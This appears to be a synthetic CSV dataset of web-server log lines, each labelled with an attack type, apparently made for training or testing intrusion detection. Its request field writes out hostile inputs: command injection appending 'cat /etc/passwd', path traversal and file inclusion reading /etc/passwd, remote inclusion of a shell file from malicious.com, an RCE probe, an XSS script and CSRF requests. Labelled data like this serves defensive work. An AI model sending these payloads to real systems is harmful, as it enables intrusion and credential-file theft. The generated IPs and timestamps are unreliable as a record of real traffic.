ip,timestamp,request,status,size,attack_type
99.225.205.144,2025-03-15 12:05:29,POST /upload-xml HTTP/1.1,200,3519,XXE_ATTACK
172.42.134.24,2025-03-15 12:04:59,GET /execute?cmd=whoami HTTP/1.1,403,3598,RCE_ATTACK
209.8.107.222,2025-03-15 12:04:31,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3253,COMMAND_INJECTION
131.243.130.218,2025-03-15 12:05:04,GET /etc/passwd HTTP/1.1,200,3068,PATH_TRAVERSAL
71.95.212.33,2025-03-15 12:05:04,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1457,LFI_ATTACK
73.166.137.210,2025-03-15 12:04:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,1996,CSRF_ATTACK
91.70.109.46,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1085,XSS_ATTACK
25.48.4.195,2025-03-15 12:04:57,POST /upload-xml HTTP/1.1,200,826,XXE_ATTACK
145.43.22.216,2025-03-15 12:05:27,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3062,COMMAND_INJECTION
149.229.138.141,2025-03-15 12:05:27,POST /upload-xml HTTP/1.1,200,2688,XXE_ATTACK
70.204.123.116,2025-03-15 12:05:15,GET /execute?cmd=whoami HTTP/1.1,403,4862,RCE_ATTACK
11.44.121.102,2025-03-15 12:05:16,GET /etc/passwd HTTP/1.1,200,4798,PATH_TRAVERSAL
63.147.233.49,2025-03-15 12:05:22,GET /api/user?username=admin HTTP/1.1,200,4302,API_ABUSE
92.81.245.36,2025-03-15 12:04:43,POST /upload-xml HTTP/1.1,200,4357,XXE_ATTACK
30.31.4.29,2025-03-15 12:05:08,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2028,LFI_ATTACK
139.220.129.101,2025-03-15 12:05:20,GET /etc/passwd HTTP/1.1,200,4323,PATH_TRAVERSAL
185.86.168.41,2025-03-15 12:05:08,POST /change-email?email=attacker@example.com HTTP/1.1,200,4403,CSRF_ATTACK
24.71.90.179,2025-03-15 12:04:50,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1120,REMOTE_FILE_INCLUSION
51.104.50.241,2025-03-15 12:05:00,GET /etc/passwd HTTP/1.1,200,3945,PATH_TRAVERSAL
211.159.49.56,2025-03-15 12:04:53,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,926,REMOTE_FILE_INCLUSION
90.137.43.46,2025-03-15 12:05:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2373,XSS_ATTACK
14.171.19.78,2025-03-15 12:04:40,POST /change-email?email=attacker@example.com HTTP/1.1,200,680,CSRF_ATTACK
66.85.9.179,2025-03-15 12:04:51,GET /etc/passwd HTTP/1.1,200,2373,PATH_TRAVERSAL
248.161.48.25,2025-03-15 12:05:25,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4585,LFI_ATTACK
48.31.19.191,2025-03-15 12:04:43,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,739,REMOTE_FILE_INCLUSION
212.41.151.72,2025-03-15 12:04:48,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2100,COMMAND_INJECTION
36.66.27.98,2025-03-15 12:05:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4544,LFI_ATTACK
71.185.186.106,2025-03-15 12:04:57,POST /change-email?email=attacker@example.com HTTP/1.1,200,2555,CSRF_ATTACK
213.174.212.5,2025-03-15 12:04:49,POST /change-email?email=attacker@example.com HTTP/1.1,200,4507,CSRF_ATTACK
223.216.237.132,2025-03-15 12:05:09,POST /wp-json/wp/v2/users HTTP/1.1,200,1465,USER_ENUMERATION
187.154.22.6,2025-03-15 12:05:02,GET /etc/passwd HTTP/1.1,200,727,PATH_TRAVERSAL
59.42.27.135,2025-03-15 12:05:30,POST /upload-xml HTTP/1.1,200,814,XXE_ATTACK
72.183.93.113,2025-03-15 12:05:01,POST /wp-json/wp/v2/users HTTP/1.1,200,4878,USER_ENUMERATION
136.158.27.146,2025-03-15 12:04:59,GET /api/user?username=admin HTTP/1.1,200,3752,API_ABUSE
22.1.50.65,2025-03-15 12:04:38,GET /api/user?username=admin HTTP/1.1,200,4284,API_ABUSE
219.98.66.104,2025-03-15 12:05:07,GET /etc/passwd HTTP/1.1,200,2231,PATH_TRAVERSAL
2.197.3.73,2025-03-15 12:05:26,GET /etc/passwd HTTP/1.1,200,4069,PATH_TRAVERSAL
237.0.97.101,2025-03-15 12:05:17,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3700,COMMAND_INJECTION
74.93.172.169,2025-03-15 12:04:35,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4658,XSS_ATTACK
17.118.240.25,2025-03-15 12:05:17,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1283,REMOTE_FILE_INCLUSION
142.250.46.80,2025-03-15 12:04:34,POST /upload-xml HTTP/1.1,200,3643,XXE_ATTACK
112.33.98.1,2025-03-15 12:04:49,GET /etc/passwd HTTP/1.1,200,4752,PATH_TRAVERSAL
227.120.21.44,2025-03-15 12:05:27,GET /etc/passwd HTTP/1.1,200,1136,PATH_TRAVERSAL
1.164.147.242,2025-03-15 12:04:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,858,CSRF_ATTACK
133.115.70.137,2025-03-15 12:05:14,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2414,XSS_ATTACK
244.236.185.173,2025-03-15 12:04:35,POST /upload-xml HTTP/1.1,200,1639,XXE_ATTACK
50.222.137.247,2025-03-15 12:04:38,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2020,LFI_ATTACK
138.167.102.75,2025-03-15 12:05:15,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3749,COMMAND_INJECTION
101.142.46.237,2025-03-15 12:05:15,GET /etc/passwd HTTP/1.1,200,1574,PATH_TRAVERSAL
113.187.126.191,2025-03-15 12:04:57,POST /upload-xml HTTP/1.1,200,3203,XXE_ATTACK
232.39.144.176,2025-03-15 12:04:54,POST /wp-json/wp/v2/users HTTP/1.1,200,956,USER_ENUMERATION
224.87.110.129,2025-03-15 12:05:18,GET /etc/passwd HTTP/1.1,200,2329,PATH_TRAVERSAL
229.0.96.33,2025-03-15 12:05:01,GET /api/user?username=admin HTTP/1.1,200,3908,API_ABUSE
126.92.163.106,2025-03-15 12:05:11,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,774,COMMAND_INJECTION
93.230.62.84,2025-03-15 12:05:07,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2803,COMMAND_INJECTION
72.86.125.2,2025-03-15 12:05:08,GET /etc/passwd HTTP/1.1,200,3146,PATH_TRAVERSAL
199.233.100.89,2025-03-15 12:05:02,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2110,XSS_ATTACK
8.15.19.247,2025-03-15 12:04:46,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1539,REMOTE_FILE_INCLUSION
12.226.109.119,2025-03-15 12:04:55,GET /api/user?username=admin HTTP/1.1,200,4870,API_ABUSE
162.198.199.29,2025-03-15 12:04:50,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4634,LFI_ATTACK
120.134.249.72,2025-03-15 12:05:14,GET /execute?cmd=whoami HTTP/1.1,403,2101,RCE_ATTACK
196.225.119.59,2025-03-15 12:05:18,POST /change-email?email=attacker@example.com HTTP/1.1,200,4534,CSRF_ATTACK
107.252.41.152,2025-03-15 12:04:41,POST /change-email?email=attacker@example.com HTTP/1.1,200,3438,CSRF_ATTACK
78.159.225.252,2025-03-15 12:05:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4910,XSS_ATTACK
60.124.182.14,2025-03-15 12:05:25,POST /upload-xml HTTP/1.1,200,3126,XXE_ATTACK
214.121.177.202,2025-03-15 12:05:08,GET /execute?cmd=whoami HTTP/1.1,403,2044,RCE_ATTACK
9.222.81.159,2025-03-15 12:04:57,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1937,COMMAND_INJECTION
238.126.41.98,2025-03-15 12:04:53,GET /api/user?username=admin HTTP/1.1,200,3625,API_ABUSE
183.42.255.27,2025-03-15 12:05:30,POST /wp-json/wp/v2/users HTTP/1.1,200,3125,USER_ENUMERATION
134.4.204.72,2025-03-15 12:05:17,POST /upload-xml HTTP/1.1,200,3033,XXE_ATTACK
102.90.58.117,2025-03-15 12:04:50,POST /change-email?email=attacker@example.com HTTP/1.1,200,3384,CSRF_ATTACK
93.154.229.217,2025-03-15 12:05:20,POST /wp-json/wp/v2/users HTTP/1.1,200,4465,USER_ENUMERATION
178.185.231.180,2025-03-15 12:05:07,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,3470,REMOTE_FILE_INCLUSION
182.100.130.79,2025-03-15 12:05:07,GET /execute?cmd=whoami HTTP/1.1,403,2459,RCE_ATTACK
158.150.151.143,2025-03-15 12:05:10,GET /api/user?username=admin HTTP/1.1,200,2547,API_ABUSE
187.159.195.89,2025-03-15 12:04:37,POST /upload-xml HTTP/1.1,200,1004,XXE_ATTACK
161.121.160.188,2025-03-15 12:04:41,POST /upload-xml HTTP/1.1,200,3464,XXE_ATTACK
6.25.237.237,2025-03-15 12:04:41,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,4804,LFI_ATTACK
92.160.210.103,2025-03-15 12:05:25,GET /execute?cmd=whoami HTTP/1.1,403,517,RCE_ATTACK
86.81.211.32,2025-03-15 12:05:13,POST /wp-json/wp/v2/users HTTP/1.1,200,4505,USER_ENUMERATION
145.122.102.28,2025-03-15 12:05:06,GET /api/user?username=admin HTTP/1.1,200,1094,API_ABUSE
181.188.249.23,2025-03-15 12:05:06,POST /wp-json/wp/v2/users HTTP/1.1,200,743,USER_ENUMERATION
252.215.82.217,2025-03-15 12:04:54,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3686,XSS_ATTACK
111.23.53.188,2025-03-15 12:05:12,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4457,XSS_ATTACK
55.48.62.126,2025-03-15 12:05:20,GET /execute?cmd=whoami HTTP/1.1,403,859,RCE_ATTACK
105.77.182.213,2025-03-15 12:05:24,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1045,COMMAND_INJECTION
175.175.102.80,2025-03-15 12:05:05,GET /execute?cmd=whoami HTTP/1.1,403,1314,RCE_ATTACK
229.66.87.49,2025-03-15 12:04:59,GET /execute?cmd=whoami HTTP/1.1,403,1222,RCE_ATTACK
197.203.59.192,2025-03-15 12:05:03,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1441,COMMAND_INJECTION
10.40.99.50,2025-03-15 12:05:31,POST /change-email?email=attacker@example.com HTTP/1.1,200,4696,CSRF_ATTACK
215.230.217.82,2025-03-15 12:04:54,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1083,LFI_ATTACK
121.212.186.225,2025-03-15 12:04:36,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1018,COMMAND_INJECTION
165.45.77.226,2025-03-15 12:04:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,4535,CSRF_ATTACK
33.92.207.197,2025-03-15 12:05:25,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,3316,XSS_ATTACK
68.171.95.181,2025-03-15 12:05:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1586,REMOTE_FILE_INCLUSION
144.138.147.176,2025-03-15 12:05:11,GET /api/user?username=admin HTTP/1.1,200,3504,API_ABUSE
230.71.49.145,2025-03-15 12:05:02,GET /api/user?username=admin HTTP/1.1,200,3365,API_ABUSE
219.200.52.18,2025-03-15 12:04:47,POST /change-email?email=attacker@example.com HTTP/1.1,200,517,CSRF_ATTACK
249.175.15.150,2025-03-15 12:05:16,GET /etc/passwd HTTP/1.1,200,692,PATH_TRAVERSAL
171.239.143.99,2025-03-15 12:05:01,POST /upload-xml HTTP/1.1,200,1661,XXE_ATTACK
61.159.236.2,2025-03-15 12:04:42,POST /change-email?email=attacker@example.com HTTP/1.1,200,2088,CSRF_ATTACK
43.241.100.93,2025-03-15 12:05:01,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1287,XSS_ATTACK
48.100.50.202,2025-03-15 12:04:49,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1204,XSS_ATTACK
39.131.173.155,2025-03-15 12:05:28,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1916,XSS_ATTACK
25.57.105.138,2025-03-15 12:04:36,POST /change-email?email=attacker@example.com HTTP/1.1,200,4278,CSRF_ATTACK
163.161.186.205,2025-03-15 12:04:54,POST /wp-json/wp/v2/users HTTP/1.1,200,4603,USER_ENUMERATION
5.0.238.205,2025-03-15 12:05:28,GET /etc/passwd HTTP/1.1,200,2554,PATH_TRAVERSAL
121.208.80.179,2025-03-15 12:05:00,GET /api/user?username=admin HTTP/1.1,200,690,API_ABUSE
165.160.35.95,2025-03-15 12:05:17,POST /wp-json/wp/v2/users HTTP/1.1,200,4938,USER_ENUMERATION
183.65.73.219,2025-03-15 12:05:22,GET /api/user?username=admin HTTP/1.1,200,1380,API_ABUSE
90.164.212.176,2025-03-15 12:05:08,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,1963,REMOTE_FILE_INCLUSION
38.185.99.45,2025-03-15 12:05:27,GET /etc/passwd HTTP/1.1,200,1059,PATH_TRAVERSAL
53.228.244.139,2025-03-15 12:04:48,GET /execute?cmd=whoami HTTP/1.1,403,2883,RCE_ATTACK
40.151.20.208,2025-03-15 12:04:59,GET /api/user?username=admin HTTP/1.1,200,1276,API_ABUSE
85.118.238.229,2025-03-15 12:05:17,POST /change-email?email=attacker@example.com HTTP/1.1,200,4175,CSRF_ATTACK
186.114.176.122,2025-03-15 12:05:13,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4373,XSS_ATTACK
133.219.57.133,2025-03-15 12:04:42,POST /change-email?email=attacker@example.com HTTP/1.1,200,2315,CSRF_ATTACK
163.222.34.201,2025-03-15 12:05:12,POST /upload-xml HTTP/1.1,200,2614,XXE_ATTACK
41.80.44.205,2025-03-15 12:05:25,POST /upload-xml HTTP/1.1,200,1048,XXE_ATTACK
160.229.100.211,2025-03-15 12:04:50,POST /wp-json/wp/v2/users HTTP/1.1,200,726,USER_ENUMERATION
188.134.121.119,2025-03-15 12:04:55,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,992,COMMAND_INJECTION
173.153.99.96,2025-03-15 12:05:36,POST /wp-json/wp/v2/users HTTP/1.1,200,3752,USER_ENUMERATION
222.160.208.19,2025-03-15 12:04:54,GET /etc/passwd HTTP/1.1,200,1624,PATH_TRAVERSAL
193.12.10.173,2025-03-15 12:05:07,GET /etc/passwd HTTP/1.1,200,4928,PATH_TRAVERSAL
149.121.18.208,2025-03-15 12:05:33,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4112,REMOTE_FILE_INCLUSION
215.158.94.49,2025-03-15 12:05:14,POST /change-email?email=attacker@example.com HTTP/1.1,200,2758,CSRF_ATTACK
179.253.103.151,2025-03-15 12:04:39,POST /wp-json/wp/v2/users HTTP/1.1,200,1317,USER_ENUMERATION
111.27.222.21,2025-03-15 12:05:25,GET /etc/passwd HTTP/1.1,200,1076,PATH_TRAVERSAL
129.128.227.141,2025-03-15 12:05:00,POST /upload-xml HTTP/1.1,200,4603,XXE_ATTACK
31.9.26.128,2025-03-15 12:05:19,POST /change-email?email=attacker@example.com HTTP/1.1,200,1487,CSRF_ATTACK
163.230.169.156,2025-03-15 12:04:58,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1297,XSS_ATTACK
4.133.119.232,2025-03-15 12:05:31,GET /execute?cmd=whoami HTTP/1.1,403,1159,RCE_ATTACK
107.116.42.170,2025-03-15 12:05:07,POST /change-email?email=attacker@example.com HTTP/1.1,200,4813,CSRF_ATTACK
106.18.19.249,2025-03-15 12:04:55,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,3474,LFI_ATTACK
61.216.88.194,2025-03-15 12:05:32,POST /change-email?email=attacker@example.com HTTP/1.1,200,630,CSRF_ATTACK
147.184.238.50,2025-03-15 12:04:54,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,2345,LFI_ATTACK
153.81.72.74,2025-03-15 12:05:10,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,1645,LFI_ATTACK
51.213.47.38,2025-03-15 12:05:34,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4194,REMOTE_FILE_INCLUSION
161.239.207.135,2025-03-15 12:05:16,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,4820,REMOTE_FILE_INCLUSION
203.137.109.111,2025-03-15 12:05:32,GET /execute?cmd=whoami HTTP/1.1,403,2447,RCE_ATTACK
172.225.38.167,2025-03-15 12:05:08,GET /etc/passwd HTTP/1.1,200,3951,PATH_TRAVERSAL
15.176.107.114,2025-03-15 12:05:35,POST /wp-json/wp/v2/users HTTP/1.1,200,4834,USER_ENUMERATION
74.213.234.170,2025-03-15 12:05:34,POST /wp-json/wp/v2/users HTTP/1.1,200,1417,USER_ENUMERATION
194.111.138.161,2025-03-15 12:05:07,GET /execute?cmd=whoami HTTP/1.1,403,2543,RCE_ATTACK
10.26.100.93,2025-03-15 12:05:33,POST /upload-xml HTTP/1.1,200,2785,XXE_ATTACK
62.35.101.156,2025-03-15 12:05:33,GET /etc/passwd HTTP/1.1,200,3593,PATH_TRAVERSAL
204.70.93.59,2025-03-15 12:05:12,POST /upload-xml HTTP/1.1,200,1660,XXE_ATTACK
159.70.17.236,2025-03-15 12:04:52,GET /execute?cmd=whoami HTTP/1.1,403,4272,RCE_ATTACK
124.233.184.21,2025-03-15 12:04:45,GET /execute?cmd=whoami HTTP/1.1,403,806,RCE_ATTACK
165.236.43.78,2025-03-15 12:05:21,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4530,COMMAND_INJECTION
86.254.34.236,2025-03-15 12:05:33,POST /change-email?email=attacker@example.com HTTP/1.1,200,3791,CSRF_ATTACK
119.119.57.85,2025-03-15 12:05:23,POST /upload-xml HTTP/1.1,200,3760,XXE_ATTACK
119.214.86.230,2025-03-15 12:05:05,POST /wp-json/wp/v2/users HTTP/1.1,200,4697,USER_ENUMERATION
12.212.83.84,2025-03-15 12:05:19,POST /change-email?email=attacker@example.com HTTP/1.1,200,4619,CSRF_ATTACK
18.209.35.87,2025-03-15 12:04:59,POST /change-email?email=attacker@example.com HTTP/1.1,200,1387,CSRF_ATTACK
181.13.10.147,2025-03-15 12:05:10,POST /change-email?email=attacker@example.com HTTP/1.1,200,1167,CSRF_ATTACK
248.105.87.24,2025-03-15 12:04:48,POST /wp-json/wp/v2/users HTTP/1.1,200,2029,USER_ENUMERATION
177.97.176.255,2025-03-15 12:04:55,GET /execute?cmd=whoami HTTP/1.1,403,3433,RCE_ATTACK
187.206.55.181,2025-03-15 12:05:06,POST /wp-json/wp/v2/users HTTP/1.1,200,4403,USER_ENUMERATION
185.199.107.37,2025-03-15 12:04:41,GET /etc/passwd HTTP/1.1,200,3079,PATH_TRAVERSAL
44.200.29.116,2025-03-15 12:04:46,GET /etc/passwd HTTP/1.1,200,1566,PATH_TRAVERSAL
211.63.181.195,2025-03-15 12:04:51,GET /etc/passwd HTTP/1.1,200,2799,PATH_TRAVERSAL
171.70.142.253,2025-03-15 12:05:26,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4364,XSS_ATTACK
45.88.41.167,2025-03-15 12:05:16,GET /etc/passwd HTTP/1.1,200,3781,PATH_TRAVERSAL
162.196.90.247,2025-03-15 12:05:05,GET /index.php?page=http://malicious.com/shell.txt HTTP/1.1,200,2528,REMOTE_FILE_INCLUSION
2.51.248.218,2025-03-15 12:04:56,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,3932,COMMAND_INJECTION
51.1.137.40,2025-03-15 12:05:38,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,4220,COMMAND_INJECTION
190.116.207.35,2025-03-15 12:04:51,GET /etc/passwd HTTP/1.1,200,1044,PATH_TRAVERSAL
162.146.63.227,2025-03-15 12:05:29,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,1424,COMMAND_INJECTION
97.213.243.211,2025-03-15 12:04:43,POST /wp-json/wp/v2/users HTTP/1.1,200,1791,USER_ENUMERATION
122.158.55.111,2025-03-15 12:05:11,GET /execute?cmd=whoami HTTP/1.1,403,4065,RCE_ATTACK
34.117.91.227,2025-03-15 12:05:18,GET /ping?ip=127.0.0.1;cat /etc/passwd HTTP/1.1,403,2943,COMMAND_INJECTION
134.94.128.94,2025-03-15 12:05:36,POST /wp-json/wp/v2/users HTTP/1.1,200,4823,USER_ENUMERATION
138.102.141.115,2025-03-15 12:05:31,GET /etc/passwd HTTP/1.1,200,4122,PATH_TRAVERSAL
13.122.82.223,2025-03-15 12:05:13,GET /api/user?username=admin HTTP/1.1,200,3808,API_ABUSE
158.226.204.17,2025-03-15 12:05:21,POST /upload-xml HTTP/1.1,200,1250,XXE_ATTACK
221.184.221.174,2025-03-15 12:05:10,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2366,XSS_ATTACK
199.158.93.16,2025-03-15 12:04:56,POST /upload-xml HTTP/1.1,200,4182,XXE_ATTACK
16.37.241.169,2025-03-15 12:04:44,POST /upload-xml HTTP/1.1,200,2709,XXE_ATTACK
123.0.214.189,2025-03-15 12:04:54,GET /etc/passwd HTTP/1.1,200,662,PATH_TRAVERSAL
150.120.175.208,2025-03-15 12:05:16,GET /api/user?username=admin HTTP/1.1,200,1876,API_ABUSE
140.244.242.36,2025-03-15 12:05:13,POST /change-email?email=attacker@example.com HTTP/1.1,200,3911,CSRF_ATTACK
207.4.26.148,2025-03-15 12:04:54,POST /change-email?email=attacker@example.com HTTP/1.1,200,2797,CSRF_ATTACK
5.134.80.97,2025-03-15 12:04:48,POST /change-email?email=attacker@example.com HTTP/1.1,200,3070,CSRF_ATTACK
225.235.87.194,2025-03-15 12:05:04,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,2077,XSS_ATTACK
137.224.83.46,2025-03-15 12:04:56,GET /etc/passwd HTTP/1.1,200,4538,PATH_TRAVERSAL
48.89.126.180,2025-03-15 12:05:16,POST /change-email?email=attacker@example.com HTTP/1.1,200,3549,CSRF_ATTACK
115.64.154.183,2025-03-15 12:04:47,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,1049,XSS_ATTACK
168.120.3.21,2025-03-15 12:05:20,POST /wp-json/wp/v2/users HTTP/1.1,200,2212,USER_ENUMERATION
24.123.213.89,2025-03-15 12:05:33,GET /index.php?page=../../../../etc/passwd HTTP/1.1,403,624,LFI_ATTACK
224.43.119.2,2025-03-15 12:05:38,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,631,XSS_ATTACK
105.61.149.95,2025-03-15 12:05:27,GET /api/user?username=admin HTTP/1.1,200,1962,API_ABUSE
10.211.181.73,2025-03-15 12:05:37,GET /profile?name=<script>alert('Hacked!')</script> HTTP/1.1,403,4157,XSS_ATTACK
3.107.100.138,2025-03-15 12:05:29,POST /change-email?email=attacker@example.com HTTP/1.1,200,3707,CSRF_ATTACK
